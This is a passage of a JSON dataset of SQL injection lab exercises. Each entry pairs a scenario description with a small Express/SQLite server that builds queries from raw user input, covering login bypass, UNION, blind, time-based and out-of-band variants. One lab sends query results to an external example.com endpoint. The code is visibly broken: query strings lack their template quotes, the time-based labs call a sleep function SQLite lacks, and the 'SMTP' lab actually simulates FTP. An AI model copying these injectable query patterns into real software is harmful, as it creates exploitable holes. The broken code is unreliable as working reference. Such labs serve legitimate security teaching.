  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE schedule (id INTEGER PRIMARY KEY, time TEXT, event TEXT)\");\n  db.run(\"INSERT INTO schedule (time, event) VALUES ('10:00', 'Meeting')\");\n});\n\napp.post('/schedule', (req, res) => {\n  const time = req.body.time;\n  const query = SELECT * FROM schedule WHERE time = '${time}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in inventory restock API",
  "Lab Description": "This lab simulates an inventory restock endpoint where restock amounts are taken from user input without validation. Attackers can inject SQL to modify stock levels.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE inventory (id INTEGER PRIMARY KEY, item TEXT, stock INTEGER)\");\n  db.run(\"INSERT INTO inventory (item, stock) VALUES ('Printer', 5)\");\n});\n\napp.post('/restock', (req, res) => {\n  const item = req.body.item;\n  const amount = req.body.amount;\n  const query = UPDATE inventory SET stock = stock + ${amount} WHERE item = '${item}';\n  console.log('Executing query:', query);\n  db.run(query, [], function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Stock updated');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in transaction rollback simulation",
  "Lab Description": "This lab simulates a transaction system where an unsanitized input in a rollback query allows attackers to inject SQL to force a rollback or alter transaction data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE transactions (id INTEGER PRIMARY KEY, amount REAL, status TEXT)\");\n  db.run(\"INSERT INTO transactions (amount, status) VALUES (100.00, 'complete')\");\n});\n\napp.post('/rollback', (req, res) => {\n  const input = req.body.input;\n  const query = BEGIN; UPDATE transactions SET status = 'rolled back' WHERE id = 1; ${input}; COMMIT;;\n  console.log('Executing query:', query);\n  db.exec(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Transaction rolled back');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in currency conversion API",
  "Lab Description": "This lab simulates an API endpoint for currency conversion that directly concatenates user inputs into the SQL query. Attackers can inject SQL to alter conversion rates or retrieve data from other financial tables.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE conversion (id INTEGER PRIMARY KEY, currency TEXT, rate REAL)\");\n  db.run(\"INSERT INTO conversion (currency, rate) VALUES ('USD', 1.0)\");\n});\n\napp.post('/convert', (req, res) => {\n  const currency = req.body.currency;\n  const query = SELECT rate FROM conversion WHERE currency = '${currency}';\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(row);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in user preference update",
  "Lab Description": "This lab simulates a settings update endpoint where user preferences are directly inserted into an SQL query. The vulnerability allows attackers to inject SQL and change user settings.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE preferences (id INTEGER PRIMARY KEY, user TEXT, theme TEXT)\");\n  db.run(\"INSERT INTO preferences (user, theme) VALUES ('user1', 'light')\");\n});\n\napp.post('/updatePreference', (req, res) => {\n  const user = req.body.user;\n  const theme = req.body.theme;\n  const query = UPDATE preferences SET theme = '${theme}' WHERE user = '${user}';\n  console.log('Executing query:', query);\n  db.run(query, [], function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Preference updated');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in voucher code redemption",
  "Lab Description": "This lab simulates an endpoint for voucher code redemption where the voucher code is unsanitized. Attackers can inject SQL to redeem invalid vouchers or modify redemption data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE vouchers (id INTEGER PRIMARY KEY, code TEXT, discount INTEGER)\");\n  db.run(\"INSERT INTO vouchers (code, discount) VALUES ('SAVE10', 10)\");\n});\n\napp.post('/redeem', (req, res) => {\n  const code = req.body.code;\n  const query = SELECT discount FROM vouchers WHERE code = '${code}';\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (row) res.send(Voucher redeemed: ${row.discount}% off);\n    else res.send('Invalid voucher code');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in event registration system",
  "Lab Description": "This lab simulates an event registration system where user inputs are directly embedded in SQL queries. Attackers can exploit this vulnerability to register unauthorized users or modify registration details.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE events (id INTEGER PRIMARY KEY, event_name TEXT, attendee TEXT)\");\n  db.run(\"INSERT INTO events (event_name, attendee) VALUES ('Conference', 'Alice')\");\n});\n\napp.post('/registerEvent', (req, res) => {\n  const event = req.body.event;\n  const attendee = req.body.attendee;\n  const query = INSERT INTO events (event_name, attendee) VALUES ('${event}', '${attendee}');\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Registration successful');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection via XML encoding bypass",
  "Lab Description": "This lab contains a SQL injection vulnerability in its stock check feature. The application returns query results in the response, allowing a UNION attack to retrieve data from a users table. Exploit this vulnerability to extract admin credentials.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"CREATE TABLE stock (id INTEGER PRIMARY KEY, product TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO stock (product, quantity) VALUES ('Laptop', 10)\");\n});\n\napp.post('/stock', (req, res) => {\n  xml2js.parseString(req.body, (err, result) => {\n    if (err) { res.status(400).send(\"Invalid XML\"); return; }\n    const product = result.stock.product[0];\n    const query = SELECT product, quantity FROM stock WHERE product = '${product}';\n    console.log(\"Executing query:\", query);\n    db.all(query, [], (err, rows) => {\n      if (err) res.status(500).send(\"Error occurred.\");\n      else res.json(rows);\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with URL encoding bypass",
  "Lab Description": "This lab simulates a login form vulnerability where user inputs are URL encoded before processing. The error messages reveal details of the underlying database. Exploit the vulnerability by crafting URL-encoded payloads to extract sensitive data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send(\"Error occurred.\");\n    else if (rows.length > 0) res.send(\"Login successful\");\n    else res.send(\"Login failed\");\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Blind SQL injection with delay-based response",
  "Lab Description": "This lab demonstrates a blind SQL injection vulnerability where response time delays are used to infer database content. Manipulate the SQL query to induce a delay when conditions are met, allowing extraction of sensitive data via timing analysis.",
  "Vulnerability name": "Blind SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT username, password, CASE WHEN (username='${username}' AND password='${password}') THEN (SELECT sleep(5)) ELSE 0 END as delay FROM users;;\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send(\"Error occurred.\");\n    else {\n      const delay = rows[0].delay;\n      if (delay >= 5) res.send(\"Vulnerability exploited: Blind SQL Injection detected.\");\n      else res.send(\"No vulnerability exploited.\");\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection using UNION attack for data retrieval",
  "Lab Description": "This lab features an application that concatenates user input into an SQL query. Attackers can use a UNION attack to merge results from different queries and retrieve data from a hidden table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n  db.run(\"CREATE TABLE customers (id INTEGER PRIMARY KEY, name TEXT, email TEXT)\");\n  db.run(\"INSERT INTO customers (name, email) VALUES ('John Doe', 'john@example.com')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else if (rows.length > 0) {\n      const unionQuery = query + \" UNION SELECT null, name, email FROM customers\";\n      db.all(unionQuery, [], (err, unionRows) => {\n        if (err) res.status(500).send('Error during UNION attack');\n        else res.json(unionRows);\n      });\n    } else {\n      res.send('Login failed');\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with error-based data extraction",
  "Lab Description": "This lab demonstrates an error-based SQL injection vulnerability. By manipulating the query, attackers can force errors that reveal database structure details such as table names and column details.",
  "Vulnerability name": "SQL Injection (Error-based)",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Laptop', 1200.00)\");\n});\n\napp.get('/search', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = SELECT * FROM products WHERE name = '${keyword}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send(err.message);\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection allowing multiple statement execution",
  "Lab Description": "This lab simulates a vulnerability where user input is concatenated into a query that allows execution of multiple SQL statements, enabling attackers to run unauthorized commands such as dropping tables or extracting data.",
  "Vulnerability name": "SQL Injection (Multiple Statement)",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/execute', (req, res) => {\n  const input = req.body.input;\n  const query = BEGIN; SELECT * FROM users; ${input}; COMMIT;;\n  console.log('Executing query:', query);\n  db.exec(query, (err) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send('Query executed successfully.');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection due to improper parameter handling",
  "Lab Description": "This lab demonstrates a common vulnerability where the application fails to use parameterized queries. User inputs are directly concatenated, allowing attackers to inject malicious SQL code and bypass authentication.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection exploiting subqueries",
  "Lab Description": "This lab targets an API that uses subqueries. The query construction using user input within a subquery is vulnerable, allowing attackers to manipulate the subquery to extract data from hidden tables.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, product TEXT, price REAL)\");\n  db.run(\"INSERT INTO orders (product, price) VALUES ('Laptop', 1200.00)\");\n  db.run(\"CREATE TABLE secret (info TEXT)\");\n  db.run(\"INSERT INTO secret (info) VALUES ('Top Secret Data')\");\n});\n\napp.post('/order', (req, res) => {\n  const product = req.body.product;\n  const query = SELECT product, price FROM orders WHERE id IN (SELECT id FROM secret WHERE info = '${product}');\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in a comment system due to weak sanitization",
  "Lab Description": "This lab simulates a comment submission system where user comments are directly inserted into an SQL query without proper sanitization. This vulnerability allows attackers to inject SQL code to manipulate or extract data from the comments table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, content TEXT)\");\n  db.run(\"INSERT INTO comments (content) VALUES ('Nice product!')\");\n});\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.comment;\n  const query = INSERT INTO comments (content) VALUES ('${comment}');\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send('Comment submitted.');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection using OR conditions in search functionality",
  "Lab Description": "This lab demonstrates a vulnerability in a search endpoint where attackers inject OR conditions into the SQL query to bypass filters and retrieve unauthorized data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE employees (id INTEGER PRIMARY KEY, name TEXT, department TEXT)\");\n  db.run(\"INSERT INTO employees (name, department) VALUES ('Alice', 'HR')\");\n});\n\napp.get('/search', (req, res) => {\n  const name = req.query.name;\n  const query = SELECT * FROM employees WHERE name = '${name}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in API endpoint for product retrieval",
  "Lab Description": "This lab simulates an API endpoint that retrieves product information based on unsanitized user input. The lack of parameterization allows attackers to inject SQL commands to extract data from other tables.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Tablet', 500.00)\");\n  db.run(\"CREATE TABLE details (product_id INTEGER, description TEXT)\");\n  db.run(\"INSERT INTO details (product_id, description) VALUES (1, 'High resolution display')\");\n});\n\napp.post('/getProduct', (req, res) => {\n  const name = req.body.name;\n  const query = SELECT * FROM products WHERE name = '${name}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else if (rows.length > 0) {\n      const unionQuery = query + \" UNION SELECT null, description, null FROM details\";\n      db.all(unionQuery, [], (err, unionRows) => {\n        if (err) res.status(500).send('Error during UNION attack');\n        else res.json(unionRows);\n      });\n    } else {\n      res.send('No product found.');\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in stored procedure simulation for order update",
  "Lab Description": "This lab simulates a stored procedure execution using dynamic SQL constructed from unsanitized user input. The vulnerability allows attackers to manipulate the procedure call and update orders without proper authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, item TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO orders (item, quantity) VALUES ('Monitor', 5)\");\n});\n\napp.post('/updateOrder', (req, res) => {\n  const newQuantity = req.body.quantity;\n  const query = UPDATE orders SET quantity = ${newQuantity} WHERE id = 1;\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send(Order updated, changes: ${this.changes});\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Boolean-based blind SQL injection in login system",
  "Lab Description": "This lab demonstrates a boolean-based blind SQL injection vulnerability in a login system. By injecting conditions like 'OR 1=1', attackers can bypass authentication. Exploit the vulnerability to log in with incorrect credentials.",
  "Vulnerability name": "Blind SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Time-based blind SQL injection in account verification",
  "Lab Description": "This lab exhibits a time-based blind SQL injection vulnerability in an account verification endpoint. By injecting a sleep delay, attackers can infer data based on the response time.",
  "Vulnerability name": "Time-based SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE accounts (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO accounts (username, password) VALUES ('user', 'pass')\");\n});\n\napp.post('/verify', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT username, CASE WHEN (username='${username}' AND password='${password}') THEN (SELECT sleep(5)) ELSE 0 END as delay FROM accounts;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows[0].delay >= 5) res.send('Vulnerability exploited: Delay detected');\n    else res.send('No vulnerability exploited');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Time-based SQL injection in mobile backend",
  "Lab Description": "This lab simulates a mobile app backend vulnerable to time-based SQL injection. By injecting a sleep delay, the system response indicates successful exploitation of the vulnerability.",
  "Vulnerability name": "Time-based SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, product TEXT, status TEXT)\");\n  db.run(\"INSERT INTO orders (product, status) VALUES ('Phone', 'Pending')\");\n});\n\napp.post('/confirm', (req, res) => {\n  const product = req.body.product;\n  const query = SELECT product, CASE WHEN (product='${product}') THEN (SELECT sleep(5)) ELSE 0 END as delay FROM orders;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (rows[0].delay >= 5) res.send('Vulnerability exploited: Delay detected');\n    else res.send('No vulnerability exploited');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Out-of-band SQL injection via DNS exfiltration in web API",
  "Lab Description": "This lab simulates an out-of-band SQL injection vulnerability where the system exfiltrates data via DNS lookups. Attackers trigger a DNS query that includes sensitive data.",
  "Vulnerability name": "SQL Injection (Out-of-Band)",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nfunction dnsLookup(data) {\n  console.log('Simulated DNS Lookup for:', data);\n  return data;\n}\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE secrets (id INTEGER PRIMARY KEY, info TEXT)\");\n  db.run(\"INSERT INTO secrets (info) VALUES ('dnsSecretData')\");\n});\n\napp.post('/api/exfil', (req, res) => {\n  const param = req.body.param;\n  const query = SELECT * FROM secrets WHERE info = '${param}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else {\n      dnsLookup(rows[0].info);\n      res.send('DNS exfiltration triggered');\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Out-of-band SQL injection with HTTP callback for data exfiltration",
  "Lab Description": "This lab demonstrates an out-of-band SQL injection vulnerability where the application triggers an HTTP callback to exfiltrate data. Attackers inject SQL that causes an HTTP request to an external logging service.",
  "Vulnerability name": "SQL Injection (Out-of-Band)",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst axios = require('axios');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reports (id INTEGER PRIMARY KEY, data TEXT)\");\n  db.run(\"INSERT INTO reports (data) VALUES ('reportDataXYZ')\");\n});\n\napp.post('/reportExfil', (req, res) => {\n  const param = req.body.param;\n  const query = SELECT * FROM reports WHERE data = '${param}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else {\n      axios.post('http://example.com/log', { data: rows[0].data })\n        .then(() => res.send('HTTP callback triggered'))\n        .catch(() => res.status(500).send('Callback error'));\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Out-of-band SQL injection via SMTP in order system",
  "Lab Description": "This lab simulates a vulnerability where the application sends exfiltrated data via email using SMTP due to an SQL injection flaw. Attackers trigger an SQL injection that causes sensitive data to be emailed out.",
  "Vulnerability name": "SQL Injection (Out-of-Band)",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst nodemailer = require('nodemailer');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst transporter = nodemailer.createTransport({\n  host: 'smtp.example.com',\n  port: 587,\n  secure: false,\n  auth: { user: 'user@example.com', pass: 'password' }\n});\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE documents (id INTEGER PRIMARY KEY, content TEXT)\");\n  db.run(\"INSERT INTO documents (content) VALUES ('ftpSecretData')\");\n});\n\napp.post('/ftpExfil', (req, res) => {\n  const param = req.body.param;\n  const query = SELECT * FROM documents WHERE content = '${param}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else {\n      console.log('Simulated FTP Transfer of:', rows[0].content);\n      res.send('FTP exfiltration simulated');\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "Out-of-band SQL injection exploiting API misconfiguration for remote logging",
  "Lab Description": "This lab simulates an API endpoint that is misconfigured and vulnerable to SQL injection. The vulnerability allows attackers to inject SQL that triggers remote logging of sensitive data via an external logging service.",
  "Vulnerability name": "SQL Injection (Out-of-Band)",
  "lab level": "Hard",
